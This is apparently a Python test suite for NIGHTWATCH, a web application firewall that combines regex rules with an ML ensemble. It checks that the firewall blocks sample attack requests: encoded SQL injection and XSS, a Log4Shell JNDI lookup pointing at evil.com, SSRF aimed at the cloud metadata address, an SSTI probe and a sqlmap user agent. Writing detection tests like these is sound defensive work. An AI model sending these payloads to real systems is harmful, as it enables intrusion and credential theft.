"""
tests/test_phase2.py
NIGHTWATCH — ML Ensemble Test

Tests that:
  1. ML models load correctly
  2. Ensemble verdict matches expected label
  3. Drift detector initializes
  4. Combined engine (regex + ML) works
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.engine import analyze, ML_AVAILABLE
from ml.models import get_ensemble
from ml.drift_detector import get_detector

GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

# ─────────────────────────────────────────────────────────────────────
#  Test Cases
#  Focus: obfuscated payloads that regex might miss but ML catches
# ─────────────────────────────────────────────────────────────────────

TESTS = [
    # Clean
    {
        "name": "✔ Clean API request",
        "request": {
            "method": "GET",
            "url": "/api/products?category=books&page=3",
            "headers": {"User-Agent": "Mozilla/5.0 Firefox/115"},
            "body": "",
            "ip": "8.8.8.8",
        },
        "expected": "ALLOW",
    },

    # Obfuscated SQLi — regex might partially miss, ML catches feature pattern
    {
        "name": "⚠ SQLi encoded (%27 OR 1=1)",
        "request": {
            "method": "GET",
            "url": "/search?q=%27%20OR%201%3D1--",
            "headers": {"User-Agent": "Mozilla/5.0"},
            "body": "",
            "ip": "5.6.7.8",
        },
        "expected": "BLOCK",
    },

    # XSS with encoding evasion
    {
        "name": "⚠ XSS URL-encoded script tag",
        "request": {
            "method": "GET",
            "url": "/page?msg=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
            "headers": {"User-Agent": "Mozilla/5.0"},
            "body": "",
            "ip": "1.2.3.4",
        },
        "expected": "BLOCK",
    },

    # Log4Shell in Referer header
    {
        "name": "⚠ Log4Shell in Referer header",
        "request": {
            "method": "GET",
            "url": "/api/data",
            "headers": {
                "User-Agent": "Mozilla/5.0",
                "Referer": "${jndi:ldap://evil.com/x}",
            },
            "body": "",
            "ip": "9.8.7.6",
        },
        "expected": "BLOCK",
    },

    # SSRF via POST body
    {
        "name": "⚠ SSRF in POST body",
        "request": {
            "method": "POST",
            "url": "/api/fetch",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "body": '{"url": "http://169.254.169.254/latest/meta-data/"}',
            "ip": "3.3.3.3",
        },
        "expected": "BLOCK",
    },

    # SSTI probe
    {
        "name": "⚠ SSTI arithmetic probe {{49}}",
        "request": {
            "method": "GET",
            "url": "/render?template={{7*7}}",
            "headers": {"User-Agent": "Mozilla/5.0"},
            "body": "",
            "ip": "2.2.2.2",
        },
        "expected": "BLOCK",
    },

    # Scanner user agent
    {
        "name": "⚠ Known scanner (sqlmap)",
        "request": {
            "method": "GET",
            "url": "/api/users?id=1",
            "headers": {"User-Agent": "sqlmap/1.7.8#stable"},
            "body": "",
            "ip": "4.4.4.4",
        },
        "expected": "BLOCK",
    },
]


def run_test(test: dict) -> bool:
    name     = test["name"]
    request  = test["request"]
    expected = test["expected"]

    result  = analyze(request)
    verdict = result["verdict"]
    passed  = verdict == expected

    status_str = f"{GREEN}PASS{RESET}" if passed else f"{RED}FAIL{RESET}"

    print(f"\n  [{status_str}] {name}")
    print(f"         Verdict   : {CYAN}{verdict}{RESET}  (expected: {expected})")
    print(f"         Risk      : {result['risk_score']} "
          f"(regex={result['regex_score']}, ml={result['ml_score']})")

    # Show ML votes if available
    if result.get("ml_result") and "votes" in result["ml_result"]:
        votes = result["ml_result"]["votes"]
        probs = result["ml_result"]["model_probabilities"]
        agreement = result["ml_result"]["agreement"]
        print(f"         ML Votes  : RF={votes['RandomForest']}({probs['RandomForest']:.2f}) | "
              f"XGB={votes['XGBoost']}({probs['XGBoost']:.2f}) | "
              f"LGB={votes['LightGBM']}({probs['LightGBM']:.2f})  [{agreement}]")

    for r in result.get("matched_rules", []):
        sev_color = RED if r["severity"] == "CRITICAL" else YELLOW
        print(f"         ⚑ [{sev_color}{r['severity']}{RESET}] {r['id']} — {r['name']}")

    return passed


def main():
    print(f"\n{BOLD}{CYAN}{'═'*65}{RESET}")
    print(f"{BOLD}{CYAN}  🦉 NIGHTWATCH — ML Test Suite{RESET}")
    print(f"{CYAN}  ML Available : {ML_AVAILABLE}{RESET}")

    # Test ensemble directly
    ensemble = get_ensemble()
    print(f"{CYAN}  Models Loaded : {ensemble.loaded}{RESET}")

    # Test drift detector
    detector = get_detector()
    print(f"{CYAN}  Drift Baseline: {'loaded' if detector._loaded else 'not loaded'}{RESET}")
    print(f"{BOLD}{CYAN}{'═'*65}{RESET}")

    passed = sum(run_test(t) for t in TESTS)
    total  = len(TESTS)

    # Drift status
    if detector._loaded:
        for _ in range(60):
            detector.record(0.3)
        drift_status = detector.check()
        print(f"\n  Drift Check: {drift_status['status']} | {drift_status['message'][:80]}")

    print(f"\n{BOLD}{'═'*65}")
    color = GREEN if passed == total else (YELLOW if passed >= total * 0.8 else RED)
    print(f"  Result: {color}{passed}/{total} passed{RESET}")
    print(f"{'═'*65}\n")

    sys.exit(0 if passed == total else 1)


if __name__ == "__main__":
    main()
